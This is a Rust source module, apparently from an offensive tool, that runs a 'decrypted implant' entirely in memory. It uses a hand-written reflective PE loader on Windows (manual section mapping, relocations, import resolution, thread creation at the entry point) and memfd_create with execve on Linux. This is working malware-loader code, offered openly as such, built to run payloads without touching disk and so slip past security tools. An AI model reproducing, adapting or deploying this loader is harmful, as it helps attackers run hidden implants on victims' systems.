//! Memory execution of decrypted implant
//!
//! Handles reflective loading on Windows and memfd execution on Linux.

use crate::error::ExecutionError;
use crate::Result;

/// Execute the decrypted payload in memory
pub fn execute_payload(payload: &[u8]) -> Result<()> {
    if payload.is_empty() {
        return Err(ExecutionError::InvalidFormat.into());
    }

    #[cfg(windows)]
    {
        execute_windows(payload)
    }

    #[cfg(unix)]
    {
        execute_unix(payload)
    }

    #[cfg(not(any(windows, unix)))]
    {
        Err(ExecutionError::UnsupportedPlatform.into())
    }
}

/// Windows: Reflective PE loading
#[cfg(windows)]
fn execute_windows(payload: &[u8]) -> Result<()> {
    use windows_sys::Win32::System::Memory::*;
    use windows_sys::Win32::System::Threading::*;
    use windows_sys::Win32::System::LibraryLoader::*;
    use windows_sys::Win32::Foundation::*;

    // Validate PE header
    if payload.len() < 64 {
        return Err(ExecutionError::InvalidFormat.into());
    }

    // Check DOS header magic "MZ"
    if payload[0] != 0x4D || payload[1] != 0x5A {
        return Err(ExecutionError::InvalidFormat.into());
    }

    // Get PE header offset
    let pe_offset = u32::from_le_bytes([payload[60], payload[61], payload[62], payload[63]]) as usize;
    if pe_offset + 24 > payload.len() {
        return Err(ExecutionError::InvalidFormat.into());
    }

    // Check PE signature "PE\0\0"
    if payload[pe_offset..pe_offset + 4] != [0x50, 0x45, 0x00, 0x00] {
        return Err(ExecutionError::InvalidFormat.into());
    }

    // Parse PE headers
    let optional_header_offset = pe_offset + 24;
    let is_64bit = payload[pe_offset + 4] == 0x64 && payload[pe_offset + 5] == 0x86;

    let (image_base, size_of_image, entry_point_rva) = if is_64bit {
        if optional_header_offset + 112 > payload.len() {
            return Err(ExecutionError::InvalidFormat.into());
        }
        let image_base = u64::from_le_bytes(
            payload[optional_header_offset + 24..optional_header_offset + 32]
                .try_into()
                .unwrap(),
        );
        let size_of_image = u32::from_le_bytes(
            payload[optional_header_offset + 56..optional_header_offset + 60]
                .try_into()
                .unwrap(),
        );
        let entry_point = u32::from_le_bytes(
            payload[optional_header_offset + 16..optional_header_offset + 20]
                .try_into()
                .unwrap(),
        );
        (image_base as usize, size_of_image as usize, entry_point as usize)
    } else {
        if optional_header_offset + 96 > payload.len() {
            return Err(ExecutionError::InvalidFormat.into());
        }
        let image_base = u32::from_le_bytes(
            payload[optional_header_offset + 28..optional_header_offset + 32]
                .try_into()
                .unwrap(),
        );
        let size_of_image = u32::from_le_bytes(
            payload[optional_header_offset + 56..optional_header_offset + 60]
                .try_into()
                .unwrap(),
        );
        let entry_point = u32::from_le_bytes(
            payload[optional_header_offset + 16..optional_header_offset + 20]
                .try_into()
                .unwrap(),
        );
        (image_base as usize, size_of_image as usize, entry_point as usize)
    };

    unsafe {
        // Allocate memory for the image
        let base_addr = VirtualAlloc(
            core::ptr::null(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if base_addr.is_null() {
            return Err(ExecutionError::AllocationFailed.into());
        }

        // Copy headers
        let size_of_headers = u32::from_le_bytes(
            payload[optional_header_offset + 60..optional_header_offset + 64]
                .try_into()
                .unwrap(),
        ) as usize;
        core::ptr::copy_nonoverlapping(
            payload.as_ptr(),
            base_addr as *mut u8,
            size_of_headers.min(payload.len()),
        );

        // Copy sections
        let num_sections = u16::from_le_bytes(
            payload[pe_offset + 6..pe_offset + 8].try_into().unwrap(),
        ) as usize;

        let section_header_offset = if is_64bit {
            optional_header_offset + 240
        } else {
            optional_header_offset + 224
        };

        for i in 0..num_sections {
            let section_offset = section_header_offset + (i * 40);
            if section_offset + 40 > payload.len() {
                break;
            }

            let virtual_address = u32::from_le_bytes(
                payload[section_offset + 12..section_offset + 16]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let size_of_raw_data = u32::from_le_bytes(
                payload[section_offset + 16..section_offset + 20]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let pointer_to_raw_data = u32::from_le_bytes(
                payload[section_offset + 20..section_offset + 24]
                    .try_into()
                    .unwrap(),
            ) as usize;

            if pointer_to_raw_data + size_of_raw_data <= payload.len() && size_of_raw_data > 0 {
                let dest = (base_addr as usize + virtual_address) as *mut u8;
                core::ptr::copy_nonoverlapping(
                    payload.as_ptr().add(pointer_to_raw_data),
                    dest,
                    size_of_raw_data,
                );
            }
        }

        // Process relocations if needed
        let delta = base_addr as isize - image_base as isize;
        if delta != 0 {
            process_relocations(base_addr as *mut u8, payload, optional_header_offset, is_64bit, delta)?;
        }

        // Resolve imports
        resolve_imports(base_addr as *mut u8, payload, optional_header_offset, is_64bit)?;

        // Set section protections
        set_section_protections(base_addr as *mut u8, payload, section_header_offset, num_sections)?;

        // Flush instruction cache
        let process = GetCurrentProcess();
        FlushInstructionCache(process, base_addr, size_of_image);

        // Calculate entry point
        let entry_point_addr = (base_addr as usize + entry_point_rva) as *const ();

        // Create thread at entry point
        let mut thread_id = 0u32;
        let thread = CreateThread(
            core::ptr::null(),
            0,
            Some(core::mem::transmute(entry_point_addr)),
            core::ptr::null(),
            0,
            &mut thread_id,
        );

        if thread == 0 {
            VirtualFree(base_addr, 0, MEM_RELEASE);
            return Err(ExecutionError::ExecutionFailed.into());
        }

        // Wait for thread (optional - could detach)
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);

        // Don't free memory - implant is running
        // VirtualFree(base_addr, 0, MEM_RELEASE);
    }

    Ok(())
}

/// Process base relocations
#[cfg(windows)]
unsafe fn process_relocations(
    base: *mut u8,
    payload: &[u8],
    optional_header_offset: usize,
    is_64bit: bool,
    delta: isize,
) -> Result<()> {
    let reloc_dir_offset = if is_64bit {
        optional_header_offset + 152
    } else {
        optional_header_offset + 136
    };

    if reloc_dir_offset + 8 > payload.len() {
        return Ok(()); // No relocations
    }

    let reloc_rva = u32::from_le_bytes(
        payload[reloc_dir_offset..reloc_dir_offset + 4].try_into().unwrap(),
    ) as usize;
    let reloc_size = u32::from_le_bytes(
        payload[reloc_dir_offset + 4..reloc_dir_offset + 8].try_into().unwrap(),
    ) as usize;

    if reloc_rva == 0 || reloc_size == 0 {
        return Ok(());
    }

    let mut offset = 0usize;
    while offset < reloc_size {
        let block_base = base.add(reloc_rva + offset);
        let page_rva = *(block_base as *const u32) as usize;
        let block_size = *(block_base.add(4) as *const u32) as usize;

        if block_size == 0 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry = *(block_base.add(8 + i * 2) as *const u16);
            let reloc_type = (entry >> 12) as u8;
            let reloc_offset = (entry & 0xFFF) as usize;

            let addr = base.add(page_rva + reloc_offset);

            match reloc_type {
                3 => {
                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
                    let val = *(addr as *const u32) as isize;
                    *(addr as *mut u32) = (val + delta) as u32;
                }
                10 => {
                    // IMAGE_REL_BASED_DIR64 (64-bit)
                    let val = *(addr as *const u64) as isize;
                    *(addr as *mut u64) = (val + delta) as u64;
                }
                0 => {} // IMAGE_REL_BASED_ABSOLUTE - skip
                _ => {}
            }
        }

        offset += block_size;
    }

    Ok(())
}

/// Resolve imports
#[cfg(windows)]
unsafe fn resolve_imports(
    base: *mut u8,
    payload: &[u8],
    optional_header_offset: usize,
    is_64bit: bool,
) -> Result<()> {
    use windows_sys::Win32::System::LibraryLoader::*;

    let import_dir_offset = if is_64bit {
        optional_header_offset + 120
    } else {
        optional_header_offset + 104
    };

    if import_dir_offset + 8 > payload.len() {
        return Ok(());
    }

    let import_rva = u32::from_le_bytes(
        payload[import_dir_offset..import_dir_offset + 4].try_into().unwrap(),
    ) as usize;

    if import_rva == 0 {
        return Ok(());
    }

    let mut descriptor_offset = import_rva;
    loop {
        let descriptor = base.add(descriptor_offset);

        let original_first_thunk = *(descriptor as *const u32) as usize;
        let name_rva = *(descriptor.add(12) as *const u32) as usize;
        let first_thunk = *(descriptor.add(16) as *const u32) as usize;

        if name_rva == 0 {
            break;
        }

        // Get DLL name
        let dll_name = base.add(name_rva);
        let dll_handle = LoadLibraryA(dll_name as *const i8);

        if dll_handle == 0 {
            return Err(ExecutionError::ImportResolutionFailed.into());
        }

        // Process imports
        let thunk_data = if original_first_thunk != 0 {
            original_first_thunk
        } else {
            first_thunk
        };

        let mut thunk_offset = 0usize;
        loop {
            let thunk = base.add(thunk_data + thunk_offset);
            let iat_entry = base.add(first_thunk + thunk_offset);

            let thunk_value = if is_64bit {
                *(thunk as *const u64) as usize
            } else {
                *(thunk as *const u32) as usize
            };

            if thunk_value == 0 {
                break;
            }

            let func_addr = if is_64bit && (thunk_value & 0x8000000000000000) != 0 {
                // Import by ordinal
                GetProcAddress(dll_handle, (thunk_value & 0xFFFF) as *const i8)
            } else if !is_64bit && (thunk_value & 0x80000000) != 0 {
                // Import by ordinal (32-bit)
                GetProcAddress(dll_handle, (thunk_value & 0xFFFF) as *const i8)
            } else {
                // Import by name
                let hint_name = base.add(thunk_value);
                let func_name = hint_name.add(2); // Skip hint
                GetProcAddress(dll_handle, func_name as *const i8)
            };

            if func_addr.is_none() {
                return Err(ExecutionError::ImportResolutionFailed.into());
            }

            if is_64bit {
                *(iat_entry as *mut u64) = func_addr.unwrap() as u64;
            } else {
                *(iat_entry as *mut u32) = func_addr.unwrap() as u32;
            }

            thunk_offset += if is_64bit { 8 } else { 4 };
        }

        descriptor_offset += 20;
    }

    Ok(())
}

/// Set section memory protections
#[cfg(windows)]
unsafe fn set_section_protections(
    base: *mut u8,
    payload: &[u8],
    section_header_offset: usize,
    num_sections: usize,
) -> Result<()> {
    use windows_sys::Win32::System::Memory::*;

    for i in 0..num_sections {
        let section_offset = section_header_offset + (i * 40);
        if section_offset + 40 > payload.len() {
            break;
        }

        let virtual_address = u32::from_le_bytes(
            payload[section_offset + 12..section_offset + 16].try_into().unwrap(),
        ) as usize;
        let virtual_size = u32::from_le_bytes(
            payload[section_offset + 8..section_offset + 12].try_into().unwrap(),
        ) as usize;
        let characteristics = u32::from_le_bytes(
            payload[section_offset + 36..section_offset + 40].try_into().unwrap(),
        );

        // Determine protection flags
        let executable = (characteristics & 0x20000000) != 0; // IMAGE_SCN_MEM_EXECUTE
        let readable = (characteristics & 0x40000000) != 0; // IMAGE_SCN_MEM_READ
        let writable = (characteristics & 0x80000000) != 0; // IMAGE_SCN_MEM_WRITE

        let protection = match (executable, readable, writable) {
            (true, true, true) => PAGE_EXECUTE_READWRITE,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, true) => PAGE_EXECUTE_WRITECOPY,
            (true, false, false) => PAGE_EXECUTE,
            (false, true, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, true) => PAGE_WRITECOPY,
            (false, false, false) => PAGE_NOACCESS,
        };

        let mut old_protect = 0u32;
        VirtualProtect(
            base.add(virtual_address) as *const _,
            virtual_size,
            protection,
            &mut old_protect,
        );
    }

    Ok(())
}

/// Linux: Execute via memfd_create
#[cfg(unix)]
fn execute_unix(payload: &[u8]) -> Result<()> {
    use std::ffi::CString;
    use std::os::unix::io::FromRawFd;
    use std::io::Write;
    use std::process::Command;

    // Validate ELF header
    if payload.len() < 52 {
        return Err(ExecutionError::InvalidFormat.into());
    }

    // Check ELF magic
    if payload[0..4] != [0x7F, 0x45, 0x4C, 0x46] {
        return Err(ExecutionError::InvalidFormat.into());
    }

    unsafe {
        // Create anonymous memory file
        let name = CString::new("").unwrap();
        let fd = libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 1u32 /* MFD_CLOEXEC */);

        if fd < 0 {
            return Err(ExecutionError::AllocationFailed.into());
        }

        let fd = fd as i32;

        // Write payload to memfd
        let written = libc::write(fd, payload.as_ptr() as *const _, payload.len());
        if written != payload.len() as isize {
            libc::close(fd);
            return Err(ExecutionError::AllocationFailed.into());
        }

        // Create path to memfd
        let path = format!("/proc/self/fd/{}", fd);

        // Fork and exec
        let pid = libc::fork();
        if pid < 0 {
            libc::close(fd);
            return Err(ExecutionError::ExecutionFailed.into());
        }

        if pid == 0 {
            // Child process
            let path_cstr = CString::new(path).unwrap();
            let argv: [*const libc::c_char; 2] = [path_cstr.as_ptr(), core::ptr::null()];
            let envp: [*const libc::c_char; 1] = [core::ptr::null()];

            libc::execve(path_cstr.as_ptr(), argv.as_ptr(), envp.as_ptr());

            // If execve returns, it failed
            libc::_exit(1);
        }

        // Parent - close fd and wait
        libc::close(fd);

        let mut status = 0i32;
        libc::waitpid(pid, &mut status, 0);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_payload() {
        assert!(execute_payload(&[]).is_err());
    }

    #[test]
    fn test_invalid_pe_header() {
        let invalid = vec![0u8; 100];
        #[cfg(windows)]
        {
            assert!(execute_payload(&invalid).is_err());
        }
    }

    #[test]
    fn test_invalid_elf_header() {
        let invalid = vec![0u8; 100];
        #[cfg(unix)]
        {
            assert!(execute_payload(&invalid).is_err());
        }
    }

    #[test]
    #[cfg(windows)]
    fn test_valid_pe_magic() {
        // MZ header
        let mut pe = vec![0u8; 1024];
        pe[0] = 0x4D; // M
        pe[1] = 0x5A; // Z
        pe[60] = 0x80; // PE header at offset 0x80
        pe[0x80] = 0x50; // P
        pe[0x81] = 0x45; // E
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;
        // This will fail later due to incomplete headers, but magic check passes
    }

    #[test]
    #[cfg(unix)]
    fn test_valid_elf_magic() {
        let mut elf = vec![0u8; 100];
        elf[0] = 0x7F;
        elf[1] = 0x45; // E
        elf[2] = 0x4C; // L
        elf[3] = 0x46; // F
        // Magic is valid, but execution will fail due to incomplete ELF
    }
}
